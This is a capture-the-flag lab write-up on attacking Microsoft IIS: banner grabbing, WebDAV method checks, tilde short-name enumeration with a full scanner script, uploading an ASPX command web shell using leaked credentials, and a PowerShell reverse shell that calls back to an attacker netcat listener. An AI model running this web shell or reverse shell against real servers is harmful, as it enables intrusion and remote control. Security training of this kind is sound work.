<h1 align="center"> Web Server Attacks - II </h1>



---


### Lab RooM:



---


## Task 1: Introduction 


### What This Task Is About

**IIS (Internet Information Services)** is Microsoft's web server for Windows. It is commonly used to host:
- Websites
- REST APIs
- Intranet portals
- ASP.NET applications
- ``.NET`` applications

Unlike Apache/Nginx on Linux, IIS is closely integrated with **Windows**, **Active Directory**, **Windows authentication**, and the **.NET runtime**.


### What You Will Learn
| # | Learning Objective             | Meaning                                                                         |
| - | ------------------------------ | ------------------------------------------------------------------------------- |
| 1 | **Fingerprint IIS**            | Identify IIS version and enabled features                                       |
| 2 | **IIS Enumeration**            | Find hidden files and directories                                               |
| 3 | **WebDAV Misconfiguration**    | Understand how an improperly configured WebDAV directory can allow file uploads |
| 4 | **ASPX Web Shells**            | Understand how ASPX files can execute server-side code                          |
| 5 | **IIS Enumeration Techniques** | Learn methods for discovering IIS configuration and exposed resources           |


### Connect to machine:

<img width="1246" height="531" alt="image" src="https://github.com/user-attachments/assets/df28649f-580a-492f-b6fb-fb47c682ce28" />

Now my target is:
````
10.49.160.207
````
<img width="970" height="202" alt="image" src="https://github.com/user-attachments/assets/2cc493db-5475-4331-8ee9-2a66e8f206fb" />




---


### Question & Answer

<img width="1249" height="168" alt="image" src="https://github.com/user-attachments/assets/e2d92783-7ebb-4cf1-8418-c4328bb19356" />


----


## Task 2: IIS Fingerprinting & Enumeration

**IIS = Internet Information Services**.

It is Microsoft's web server software, mainly used on Windows Server and Windows.
| Term                 | Meaning                                 |
| -------------------- | --------------------------------------- |
| **IIS**              | Internet Information Services           |
| **Full name**        | Microsoft Internet Information Services |
| **Developed by**     | Microsoft                               |
| **Platform**         | Windows                                 |
| **Main purpose**     | Host websites and web applications      |
| **Common protocols** | HTTP / HTTPS                            |
| **Similar to**       | Nginx, Apache                           |


````
IIS Target
   │
   ├── 1. Check Server headers
   │       ↓
   │    Identify IIS version
   │
   ├── 2. Check HTTP methods
   │       ↓
   │    Detect WebDAV
   │
   ├── 3. Check writable directories
   │       ↓
   │    /webdav/
   │
   └── 4. Test file handling
           ↓
       Upload / execution behavior
````



### 1. What IIS Version Numbers Tell You

IIS versions are closely associated with Windows Server versions. Knowing the IIS version helps us understand what features may be available and which vulnerabilities may be relevant.

| IIS Version   | Windows Server            | Status      |
| ------------- | ------------------------- | ----------- |
| IIS 6.0       | Server 2003               | End of Life |
| IIS 7.0 / 7.5 | Server 2008 / 2008 R2     | End of Life |
| IIS 8.0 / 8.5 | Server 2012 / 2012 R2     | End of Life |
| IIS 10.0      | Server 2016 / 2019 / 2022 | Current     |



### 2. IIS Architecture (The Parts That Matter for Attacks)


Understanding the request flow helps you know where vulnerabilities live and why certain attacks work. A request arriving at an IIS server passes through several layers:

An HTTP request passes through several IIS components:
<img width="1135" height="1214" alt="image" src="https://github.com/user-attachments/assets/b18d6e69-79d3-4dcb-ae39-d0e85898d6ac" />

| Component            | Role                                                |
| -------------------- | --------------------------------------------------- |
| **HTTP.sys**         | Kernel-level HTTP driver that receives HTTP traffic |
| **W3SVC / WAS**      | Manages IIS services and application pools          |
| **w3wp.exe**         | IIS worker process that handles requests            |
| **ASP.NET / .NET**   | Processes ASP.NET applications                      |
| **Application Code** | Website/API logic                                   |

The important idea is that different vulnerabilities can exist at different layers.


### 3. HTTP Banner Grabbing
The fastest way to fingerprint IIS is to inspect the response headers.

#### Syntax:
````
curl -I http://TARGET_IP
````

Example:
````
curl -I http://10.49.160.207
````
<img width="602" height="287" alt="image" src="https://github.com/user-attachments/assets/370d03a5-2f66-47cd-8232-28e910fcd984" />


#### HTTP Headers
| Header             | Example Value                   | Purpose                                       |
| ------------------ | ------------------------------- | --------------------------------------------- |
| **HTTP Status**    | `HTTP/1.1 200 OK`               | Request was successful                        |
| **Content-Length** | `703`                           | Size of response body                         |
| **Content-Type**   | `text/html`                     | Response is HTML                              |
| **Last-Modified**  | `Mon, 13 Apr 2026 14:05:52 GMT` | Last modification time                        |
| **Accept-Ranges**  | `bytes`                         | Allows partial file requests                  |
| **ETag**           | `"d5e75da34ecbdc1:0"`           | Identifies a specific version of the resource |
| **Server**         | `Microsoft-IIS/10.0`            | Identifies IIS and its version                |
| **X-Powered-By**   | `ASP.NET`                       | Identifies the web application technology     |
| **Date**           | `Thu, 13 Aug 2026 14:19:52 GMT` | Time the response was generated               |
| `Server`           | `Microsoft-IIS/10.0` | Confirms IIS and version |
| `X-AspNet-Version` | `4.x`                | May reveal .NET version  |


#### What to look for
````
Server: Microsoft-IIS/10.0
        │
        └── IIS detected
             │
             └── Version = 10.0
````



### 4. WebDAV Detection with OPTIONS
**WebDAV** extends HTTP with methods for managing files remotely.

Important WebDAV methods include:
| Method     | Purpose                    |
| ---------- | -------------------------- |
| `PUT`      | Create/upload a file       |
| `DELETE`   | Delete a file              |
| `COPY`     | Copy a resource            |
| `MOVE`     | Move a resource            |
| `PROPFIND` | Query resource information |
| `LOCK`     | Lock a resource            |
| `UNLOCK`   | Remove a lock              |


Check the server's supported methods:
````
curl -X OPTIONS http://TARGET_IP/webdav/ -sv 2>&1 | grep -E "Allow:|DAV:"
````

| Part                   | Meaning                                            |  
| ---------------------- | -------------------------------------------------- |
| `curl`                 | Sends an HTTP request                              | 
| `-X OPTIONS`           | Sends an HTTP `OPTIONS` request                    |
| `http://10.49.160.207` | Target web server                                  |
| `-s`                   | Silent mode                                        |                                           
| `-v`                   | Verbose output, including request/response headers |                                            
| `2>&1`                 | Combines error output with normal output           |                                           
| `grep -E`              | Searches using an extended pattern                 |                                            
| `"Allow:`               | DAV:" ` Searches for either `Allow:` **OR** `DAV:` |
| `Allow:`               | Shows HTTP methods the server allows               |                                  
| `DAV:`                 | Shows WebDAV capabilities supported by the server  |                                            


Example:
````
curl -X OPTIONS http://10.49.160.207 -sv 2>&1 | grep -E "Allow:|DAV:"
````
<img width="1277" height="135" alt="image" src="https://github.com/user-attachments/assets/0a08f1db-6657-476b-bce3-0d22fda4f44f" />


The ``DAV:`` header is a strong indication that WebDAV is enabled.

If WebDAV is enabled, the response includes a ``DAV:`` header and an extended ``Allow:`` list:
````
curl -X OPTIONS http://10.49.160.207/webdav -sv 2>&1 | grep -E "Allow:|DAV:"
````

### 5. Why WebDAV Matters

WebDAV itself is not automatically a vulnerability.

The dangerous situation is:
````
WebDAV enabled
      ↓
Directory is writable
      ↓
Files can be uploaded
      ↓
Uploaded files are processed
      ↓
Potential security impact
````
So the investigation should determine **what the WebDAV directory permits**, rather than assuming that WebDAV automatically means compromise.


### 6. Testing What File Types Can Be Uploaded and Executed
````
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.49.160.207/webdav/test.aspx
````
<img width="1798" height="88" alt="image" src="https://github.com/user-attachments/assets/24859090-89db-45bc-9507-8ef70bf505eb" />


| Part                                    | Meaning                                       |
| --------------------------------------- | --------------------------------------------- |
| `curl`                                  | Sends an HTTP request                         |
| `-s`                                    | Silent mode                                   |
| `-o /dev/null`                          | Discards the response body                    |
| `-w "PUT aspx: %{http_code}\n"`         | Prints the HTTP status code after the request |
| `-X PUT`                                | Uses the HTTP `PUT` method                    |
| `--data '...'`                          | Sends the supplied data as the request body   |
| `<%@ Page Language=Jscript%>...`        | ASP.NET/JScript page content                  |
| `http://10.49.160.207/webdav/test.aspx` | Target WebDAV URL and `.aspx` filename        |


After identifying WebDAV, the lab checks whether the directory accepts files.

The basic concept is:
````
PUT file
   │
   ▼
Does IIS accept it?
   │
   ├── No → Not writable
   │
   └── Yes → File was created
                  │
                  ▼
             GET the file
                  │
                  ▼
          How does IIS process it?
````
A successful upload may produce:
````
201 Created
````
This means the server accepted the uploaded resource.

The next question is whether IIS **serves it as a normal file or processes it as server-side code**.




### 7. Normal vs Suspicious Traffic
| Pattern       | Normal                            | Suspicious                          |
| ------------- | --------------------------------- | ----------------------------------- |
| HTTP methods  | `GET`, `POST`, `HEAD`             | `PUT`, `MOVE`, `DELETE`, `PROPFIND` |
| File types    | `.html`, `.css`, `.js`            | Unexpected `.aspx` files            |
| Status codes  | `200`, `304`, `301`, `302`, `404` | Unexpected `201 Created`            |
| Server header | Expected IIS version              | Unexpected/EOL version              |
| WebDAV        | Not exposed                       | `DAV:` header                       |
| Directory     | Read-only                         | Writable WebDAV directory           |


---

### Questions & Answers:


#### 1. What HTTP response header reveals the IIS version?

````
curl -I http://10.49.160.207
````
<img width="568" height="277" alt="image" src="https://github.com/user-attachments/assets/54fb9073-6dce-4202-b00d-a122856d6c61" />

Answer is:
````
Server  
````
<img width="1523" height="145" alt="image" src="https://github.com/user-attachments/assets/b0f15aea-eea2-40e0-baba-0b61ad5ae31d" />


---


#### 2. What is the HTTP response code after executing the PUT request on the /webdav directory?

````
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.49.160.207/webdav/test.aspx
````
<img width="1788" height="152" alt="image" src="https://github.com/user-attachments/assets/55ff448a-851c-441b-a7c0-892ce21d82e0" />


Now we see answer is:
````
401
````



----


## Task 3: IIS Tilde (Short Filename) Enumeration

### What Is IIS Tilde Enumeration?
IIS can sometimes reveal information about files and directories through the **Windows 8.3 short filename format**.

<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/c09c6676-120b-4771-8b5b-8f3cb85ba2b7" />


Windows may create a short name for a long filename:
````
BackupFiles
     ↓
BACKUP~1
````
An attacker can use differences in IIS responses to determine whether a particular short name exists.


### 2. The 8.3 Short Filename Format

The traditional Windows format is:
````
XXXXXXXX.XXX
````
- Up to ``8 characters`` for the filename
- Up to ``3 characters`` for the extension

For example:
````
BackupFiles
    ↓
BACKUP~1
````
Another example:
````
AdminPortal
    ↓
ADMINI~1
````

| Long Name           | Possible 8.3 Name |
| ------------------- | ----------------- |
| `BackupFiles`       | `BACKUP~1`        |
| `AdminPortal`       | `ADMINI~1`        |
| `configuration.asp` | `CONFIG~1.ASP`    |
| `users_backup.xlsx` | `USERS_~1.XLS`    |

The short name does **not necessarily reveal the complete original filename**. It mainly gives useful information about the beginning of the name and extension.



### 3. How the Enumeration Works
````
Attacker
   │
   ▼
Send specially crafted HTTP request
   │
   ▼
IIS processes short-name pattern
   │
   ├── Different response
   │       ↓
   │   Possible resource exists
   │
   └── Normal response
           ↓
       Probably doesn't exist
````

The important signal is often a **difference in HTTP response status or response size**.

````
/backup~1/
      ↓
404 response with one size

/random~1/
      ↓
404 response with another size
````
That difference can indicate that IIS recognizes the short-name pattern.



### 4. Scanning with iis_shortname_scan.py

The lab provides a scanner that automates this process.


First enter the scanner directory:
````
cd /opt/IIS_Shortname_Scanner
````
Then run:
````
python3 iis_shortname_scan.py http://TARGET_IP/
````

Example:

````
git clone https://github.com/lijiejie/IIS_shortname_Scanner.git
````
````
cd ~/IIS_shortname_Scanner
````

<img width="831" height="269" alt="image" src="https://github.com/user-attachments/assets/7e017c91-dc1c-4d8e-9723-d4daab8b1103" />

````
ls -la
````

<img width="583" height="178" alt="image" src="https://github.com/user-attachments/assets/095ed61e-cc48-427c-8c34-b9d63554910b" />


````
python3 iis_shortname_scan.py http://10.49.160.207/
````
<img width="822" height="611" alt="image" src="https://github.com/user-attachments/assets/d7770e0c-9db8-4f2c-b317-2df6a6532dee" />

| Output                 | Meaning                                                                  |
| ---------------------- | ------------------------------------------------------------------------ |
| `Server is vulnerable` | IIS responds differently to requests that trigger the 8.3/tilde behavior |
| `/b~1.*`               | Scanner is testing names beginning with `b`                              |
| `/backu~1.*`           | It discovered that `backu...` is a valid prefix                          |
| `/backup~1`            | A complete short 8.3 directory name was identified                       |
| `[Done]`               | Scanner finished reconstructing that short name                          |
| `/aspnet~1`            | Another directory was discovered                                         |
| `Dir:`                 | The discovered item is a directory                                       |
| `2 Directories`        | Two directories were found                                               |
| `0 Files`              | No individual files were identified by the short-name scan               |

#### Full script:
````
#!/usr/bin/env python
# encoding:utf-8
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com    

import sys
import threading
import time
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

try:
    # python 2.x
    import httplib
    import urlparse
    import Queue as queue
except Exception as e:
    # python 3.x
    import http.client as httplib
    import urllib.parse as urlparse
    import queue


class Scanner(object):
    def __init__(self, target):
        self.target = target.lower()
        if not self.target.startswith('http'):
            self.target = 'http://%s' % self.target
        self.scheme, self.netloc, self.path, params, query, fragment = urlparse.urlparse(target)
        if self.path[-1:] != '/':    # ends with slash
            self.path += '/'
        self.alphanum = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
        self.files = []
        self.dirs = []
        self.queue = queue.Queue()
        self.lock = threading.Lock()
        self.threads = []
        self.request_method = ''
        self.msg_queue = queue.Queue()
        self.STOP_ME = False
        threading.Thread(target=self._print).start()

    def _conn(self):
        try:
            if self.scheme == 'https':
                conn = httplib.HTTPSConnection(self.netloc)
            else:
                conn = httplib.HTTPConnection(self.netloc)
            return conn
        except Exception as e:
            print('[_conn.Exception]', e)
            return None

    def _get_status(self, path):
        try:
            conn = self._conn()
            conn.request(self.request_method, path)
            status = conn.getresponse().status
            conn.close()
            return status
        except Exception as e:
            raise Exception('[_get_status.Exception] %s' % str(e))

    def is_vulnerable(self):
        try:
            for _method in ['GET', 'OPTIONS']:
                self.request_method = _method
                status_1 = self._get_status(self.path + '/*~1*/a.aspx')    # an existed file/folder
                status_2 = self._get_status(self.path + '/l1j1e*~1*/a.aspx')    # not existed file/folder
                if status_1 == 404 and status_2 != 404:
                    return True
            return False
        except Exception as e:
            raise Exception('[is_vul.Exception] %s' % str(e) )

    def run(self):
        for c in self.alphanum:
            self.queue.put((self.path + c, '.*'))    # filename, extension
        for i in range(20):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()
        for t in self.threads:
            t.join()
        self.STOP_ME = True

    def report(self):
        print('-' * 64)
        for d in self.dirs:
            print('Dir:  %s' % d)
        for f in self.files:
            print('File: %s' % f)
        print('-' * 64)
        print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))
        print('Note that * is a wildcard, matches any character zero or more times.')

    def _print(self):
        while not self.STOP_ME or (not self.msg_queue.empty()):
            if self.msg_queue.empty():
                time.sleep(0.05)
            else:
                print(self.msg_queue.get())

    def _scan_worker(self):
        while True:
            try:
                url, ext = self.queue.get(timeout=1.0)
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self.msg_queue.put('[+] %s~1%s\t[scan in progress]' % (url, ext))

                    if len(url) - len(self.path) < 6:    # enum first 6 chars only
                        for c in self.alphanum:
                            self.queue.put((url + c, ext))
                    else:
                        if ext == '.*':
                            self.queue.put((url, ''))

                        if ext == '':
                            self.dirs.append(url + '~1')
                            self.msg_queue.put('[+] Directory ' + url + '~1\t[Done]')

                        elif len(ext) == 5 or (not ext.endswith('*')):    # .asp*
                            self.files.append(url + '~1' + ext)
                            self.msg_queue.put('[+] File ' + url + '~1' + ext + '\t[Done]')

                        else:
                            for c in 'abcdefghijklmnopqrstuvwxyz0123456789':
                                self.queue.put((url, ext[:-1] + c + '*'))
                                if len(ext) < 4:    # < len('.as*')
                                    self.queue.put((url, ext[:-1] + c))

            except queue.Empty as e:
                break
            except Exception as e:
                print('[Exception]', e)


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print('Usage: python IIS_shortname_Scan.py http://www.target.com/')
        sys.exit()

    target = sys.argv[1]
    s = Scanner(target)
    if not s.is_vulnerable():
        s.STOP_ME = True
        print('Server is not vulnerable')
        sys.exit(0)

    print('Server is vulnerable, please wait, scanning...')
    s.run()
    s.report()
````

#### How the Scanner Works

The scanner starts with short prefixes:
````
a~1.*
b~1.*
c~1.*
...
````
If IIS responds differently for a prefix, the scanner continues expanding it.

For example:
````
b~1.*
   ↓
ba~1.*
   ↓
bac~1.*
   ↓
back~1.*
   ↓
backu~1.*
   ↓
backup~1
````
So it gradually reconstructs the short name.


#### What the Results Mean

Example:
````
Directory: /aspnet~1
Directory: /backup~1
````
2 Directories, 0 Files found

This tells us that IIS appears to have resources whose short names begin with:
````
ASPNET
BACKUP
````
The scanner does not automatically tell us the complete original name.




### 5. What the Short Name Tells You

| Short Name     | Possible Full Name  | Why Interesting           |
| -------------- | ------------------- | ------------------------- |
| `BACKUP~1/`    | `BackupFiles/`      | Could contain backups     |
| `ADMINI~1/`    | `AdminInterface/`   | Could be an admin area    |
| `CONFIG~1.ASP` | `configuration.asp` | May contain configuration |
| `USERS_~1.XLS` | `users_backup.xlsx` | Could contain user data   |

The discovered short name is reconnaissance information. We then investigate the corresponding resource through normal, authorized HTTP requests.




### 6. Enumerating a Discovered Directory
````
curl http://10.49.160.207/BackupFiles/
````
<img width="1903" height="217" alt="image" src="https://github.com/user-attachments/assets/296c67cf-a670-49ee-b533-3bdbfe54d08f" />


Or open in browser:
````
http://10.49.160.207/BackupFiles/
````
<img width="1317" height="356" alt="image" src="https://github.com/user-attachments/assets/d995db6c-3b81-44b2-b739-f41c7aebcef3" />


Suppose the scanner finds:
````
Directory: /backup~1
````
The lab then tries likely full-name completions, for example:
````
/backup/
/BackupFiles/
/backup_data/
````
If you identify the correct directory and directory listing is enabled, you may see:
````
Index of /BackupFiles/

webdav_notes.txt
````
Then retrieve the file:
````
curl http://TARGET_IP/BackupFiles/webdav_notes.txt
````


Example:
````
curl http://10.49.160.207/BackupFiles/webdav_notes.txt
````
<img width="754" height="154" alt="image" src="https://github.com/user-attachments/assets/fa7b366d-538f-4971-a84e-405554014ec1" />


Example output:
````
WebDAV setup notes

Directory: /webdav/
Username: [Username]
Password: [Password]
````
This demonstrates why short-name enumeration matters: a directory that wasn't obvious from normal enumeration can sometimes be discovered through its 8.3 name.

---

### Questions & Answers:

#### 1.What character in a URL path triggers the IIS tilde enumeration response difference?
````
~
````
<img width="1544" height="135" alt="image" src="https://github.com/user-attachments/assets/8a6ee9fd-21bf-4605-89d5-508e08571667" />

---

#### 2. What legacy Windows filename format does the tilde enumeration vulnerability exploit? (Answer Format: X.X)
````
8.3
````
<img width="1567" height="123" alt="image" src="https://github.com/user-attachments/assets/c4275164-9eba-4e51-bf83-8d75e51695d1" />


| Part      |                  Limit |
| --------- | ---------------------: |
| Filename  | Up to **8 characters** |
| Extension | Up to **3 characters** |

---


#### 3. What password is stored in the file discovered through tilde enumeration?
````
curl http://10.49.160.207/BackupFiles/webdav_notes.txt
````
<img width="722" height="167" alt="image" src="https://github.com/user-attachments/assets/7db3f9f2-f8f9-409a-8b4a-1a4462f8832a" />


Now we see password is:
````
P@ssw0rd!123
````
<img width="1541" height="123" alt="image" src="https://github.com/user-attachments/assets/a31d7a05-a290-4c86-99f1-d3855dc8bc8b" />


----


## Task 4: WebDAV Exploitation: Uploading an ASPX Shell

This task takes the credentials discovered in Task 3 and uses them to test whether the IIS WebDAV directory allows an authenticated file upload.


### 1. Three Conditions for a Successful Shell Upload

For the ASPX file upload to work, all three conditions must be true:

| Condition                  | Meaning                                                               |
| -------------------------- | --------------------------------------------------------------------- |
| **WebDAV enabled**         | IIS accepts WebDAV methods such as `PUT`                              |
| **Valid credentials**      | The `/webdav/` directory requires authentication                      |
| **Script Execute enabled** | IIS executes `.aspx` files instead of treating them as ordinary files |


The attack flow is:
````
Credentials
     ↓
NTLM Authentication
     ↓
PUT /webdav/cmd.aspx
     ↓
HTTP 201 Created
     ↓
Request cmd.aspx
     ↓
ASP.NET executes the file
````
If one condition is missing, execution will fail.


### 2. Preparing the ASPX Shell

The lab uses an ASPX file named:
````
cmd.aspx
````
The important idea is that the page reads a cmd parameter:
````
cmd.aspx?cmd=whoami
````
and executes that command through Windows cmd.exe.

The lab's example shell is:
````
<%@ Page Language="C#" %>
<%
string cmd = Request.QueryString["cmd"];

if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
}
%>
````

Save as `cmd.aspx`.
<img width="706" height="285" alt="image" src="https://github.com/user-attachments/assets/b5b9d41d-9a3a-408d-b8a5-6da8f4409eaf" />


To save it just press `Ctrl + O` -> `Enter` -> `Ctrl + X`.
````
ls
cat cmd.aspx
````
<img width="824" height="356" alt="image" src="https://github.com/user-attachments/assets/35ab4e1d-61ab-48c0-b13a-8a9db306620d" />


### 3. Uploading the ASPX Shell

The lab uses NTLM authentication with ``curl``.

The important options are:
| Option     | Meaning                          |
| ---------- | -------------------------------- |
| `-v`       | Show detailed HTTP communication |
| `--ntlm`   | Use NTLM authentication          |
| `-u`       | Supply username and password     |
| `-T`       | Upload a local file using `PUT`  |
| `cmd.aspx` | File being uploaded              |
| `/webdav/` | WebDAV destination               |

On lab above we see the target have Password:
````
P@ssw0rd!123
````

Check it again:
````
curl http://10.49.160.207/BackupFiles/webdav_notes.txt
````
<img width="623" height="107" alt="image" src="https://github.com/user-attachments/assets/14ff4d45-eb58-499b-8863-e5eedba5e5ea" />


After exploit it:
````
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.49.160.207/webdav/cmd.aspx
````
<img width="1912" height="898" alt="image" src="https://github.com/user-attachments/assets/a5558b5c-de43-47db-84aa-674f3524a529" />


<img width="1036" height="687" alt="image" src="https://github.com/user-attachments/assets/6aced505-2d91-4b5a-ac40-15b51f5a6001" />



### 4. What Does 201 Created Mean?

This is the important part of the output:
````
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
````
``201`` Created means:
````
PUT request
     ↓
Authentication accepted
     ↓
File uploaded
     ↓
IIS created cmd.aspx
````
So the upload was successful.




###5. Confirming Execution

Now request the uploaded ASPX file with a harmless command:
````
curl "http://10.49.160.207/webdav/cmd.aspx?cmd=whoami"
````
<img width="630" height="80" alt="image" src="https://github.com/user-attachments/assets/822b923f-b2ef-4b31-ae96-18effd08c0ac" />


This tells you which Windows identity is executing the ASPX application.


---

### Questions & Answers:


#### 1. What HTTP status code confirms a file was successfully created via PUT?
````
201
````
<img width="953" height="80" alt="image" src="https://github.com/user-attachments/assets/1b242b33-d8b9-4ee2-964f-10b883dddb31" />

---

#### 2. What curl flag is required to authenticate with NTLM when uploading via WebDAV?
````
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.49.160.207/webdav/cmd.aspx
````
<img width="1910" height="843" alt="image" src="https://github.com/user-attachments/assets/fc429e31-de5d-41f1-ba5b-895ab50f804e" />

Now answer is:
````
--ntlm
````
<img width="1376" height="120" alt="image" src="https://github.com/user-attachments/assets/118a332e-bd4c-42b4-ba8e-140d5709d09a" />



----


## Task 5: ASPX Web Shells


### What an ASPX Web Shell Is

An **ASPX web shell** is an **ASP.NET** ``.aspx`` page that accepts input through an HTTP request and executes commands on the IIS server.

The basic flow is:
````
Browser / curl
      │
      │ HTTP request
      ▼
   cmd.aspx
      │
      ▼
 ASP.NET Handler
      │
      ▼
   w3wp.exe
      │
      ▼
 Windows Command
      │
      ▼
 Command Output
````
The important point is that the command executes **inside the IIS worker process**.

Therefore, the account running the IIS application pool determines what the shell can access.



### Step 1: Execute Commands Through the Shell

The lab shell accepts commands using the ``cmd`` query parameter.

For example:
````
curl "http://TARGET/webdav/cmd.aspx?cmd=whoami"
````

Example:
````
curl "http://10.49.166.153/webdav/cmd.aspx?cmd=whoami"
````
<img width="724" height="166" alt="image" src="https://github.com/user-attachments/assets/de2cd43d-981f-40a5-993e-2683388d3067" />



What does this tell us?
````
cmd.aspx
   │
   ▼
IIS
   │
   ▼
Application Pool
   │
   ▼
iis apppool\defaultapppool
````
The shell is running as:
````
iis apppool\defaultapppool
````
So it is **not automatically Administrator or SYSTEM**.




#### Useful Commands

Once the shell is uploaded, you can use simple commands to understand the environment:

````
curl "http://10.49.166.153/webdav/cmd.aspx?cmd=hostname"
````
<img width="794" height="196" alt="image" src="https://github.com/user-attachments/assets/b44efcc1-c88f-4cbe-850f-a3088558b009" />

````
curl "http://10.49.166.153/webdav/cmd.aspx?cmd=ipconfig"
````
<img width="928" height="405" alt="image" src="https://github.com/user-attachments/assets/30885e8e-d3c1-4399-a8e6-99cca9edc5bd" />


````
curl "http://10.49.166.153/webdav/cmd.aspx?cmd=dir+C:\\"
````
<img width="859" height="512" alt="image" src="https://github.com/user-attachments/assets/ead69d91-28da-40eb-a784-749871e9f258" />


#### Purpose:
| Command        | Purpose                       |
| -------------- | ----------------------------- |
| `whoami`       | Shows current Windows account |
| `hostname`     | Shows computer name           |
| `ipconfig`     | Shows network configuration   |
| `dir C:\`      | Lists files/directories       |
| `whoami /priv` | Shows available privileges    |


#### Common Command:
| Command                         | Purpose                    |
| ------------------------------- | -------------------------- |
| `whoami`                        | Current user               |
| `whoami /priv`                  | User privileges            |
| `whoami /groups`                | User groups                |
| `hostname`                      | Computer name              |
| `systeminfo`                    | OS/system information      |
| `ipconfig /all`                 | Network details            |
| `net user`                      | List users                 |
| `net localgroup administrators` | List administrators        |
| `tasklist`                      | Running processes          |
| `netstat -ano`                  | Network connections + PIDs |
| `sc query`                      | Windows services           |
| `schtasks /query`               | Scheduled tasks            |
| `dir /a`                        | Files + hidden files       |
| `tree`                          | Directory structure        |
| `type file.txt`                 | Read a file                |
| `findstr /s /i "password" *.*`  | Search files for keywords  |
| `gpresult /r`                   | Applied Group Policies     |
| `net share`                     | Network shares             |
| `arp -a`                        | ARP table                  |
| `route print`                   | Routing table              |


> **Note**: URL-encode spaces as ``+`` or ``%20`` in the ``cmd`` parameter. Command output containing special characters may display differently depending on the encoding, but the underlying commands still run correctly.



### Step 2: Escalate to a Reverse Shell

A command shell through HTTP is useful, but it is not very interactive.

The lab demonstrates moving from:

````
HTTP Command Shell
       ↓
PowerShell
       ↓
Netcat Listener
       ↓
Interactive Shell
````


#### On terminal 1:
First, the AttackBox starts a listener:
````
ifconfig
````
<img width="778" height="828" alt="image" src="https://github.com/user-attachments/assets/53636be9-f71d-42f9-8447-5bf93134734b" />


Now in this my target is:
````
10.49.119.172
````

````
nc -lvnp 443
````
<img width="359" height="99" alt="image" src="https://github.com/user-attachments/assets/36398986-5442-4226-a88c-ea60e3fcdaf0" />


| Option   | Meaning                  |
| -------- | ------------------------ |
| `-l`     | Listen                   |
| `-v`     | Verbose                  |
| `-n`     | Don't perform DNS lookup |
| `-p 443` | Listen on port 443       |


We then use the ASPX shell to make the Windows host connect back to the listener.


Next, construct the **PowerShell** reverse shell command and pass it through the ASPX shell. Replace ``10.49.119.172`` with your AttackBox IP address or the ``tun0`` interface IP if using the TryHackMe VPN:
````
powershell -NoP -NonI -W Hidden -Exec Bypass -c `
"$client = New-Object System.Net.Sockets.TCPClient('{10.49.119.172}',443);`
$stream = $client.GetStream();`
[byte[]]$bytes = 0..65535|%{0};`
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
$sendback = (iex $data 2>&1 | Out-String );`
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
$client.Close()""
````

| Flag           | Meaning                              |
| -------------- | ------------------------------------ |
| `-NoP`         | Don't load PowerShell profile        |
| `-NonI`        | Non-interactive mode                 |
| `-W Hidden`    | Hide PowerShell window               |
| `-Exec Bypass` | Bypass execution-policy restrictions |
| `-c`           | Execute the supplied command         |


#### Command:
````
curl -G "http://TARGET_IP/webdav/cmd.aspx" --data-urlencode 'cmd=OUR_POWERSHELL_REVERSE_SHELL'
````



#### On Terminal 2:
````
curl -G "http://10.49.166.153/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.49.119.172'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
````
<img width="1916" height="159" alt="image" src="https://github.com/user-attachments/assets/1697fa5b-63cf-4096-ad18-de27ac859491" />

> **Note**: Don't forget to change target. Change `10.49.119.172` to our IP.

After back to attacker terminal:

<img width="426" height="144" alt="image" src="https://github.com/user-attachments/assets/3c7fff04-5d37-4c02-834d-9587ca2fa99a" />


Now we see this, just press `Enter` it will show target shell:
<img width="413" height="130" alt="image" src="https://github.com/user-attachments/assets/1cdc9929-0c5e-4278-a360-38043342c1e7" />

Now we got success to get shell.

### Step 3: Confirm Privileges

After receiving the Windows shell, run:
````
whoami /priv
````
<img width="769" height="405" alt="image" src="https://github.com/user-attachments/assets/f8b7b01b-c5de-45aa-8af6-6f863a4f9777" />


We may see privileges such as:
````
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeCreateGlobalPrivilege
````
The important one in this lab is:
````
SeImpersonatePrivilege
````

#### Why is it important?

SeImpersonatePrivilege allows a process to impersonate another security context under certain conditions.

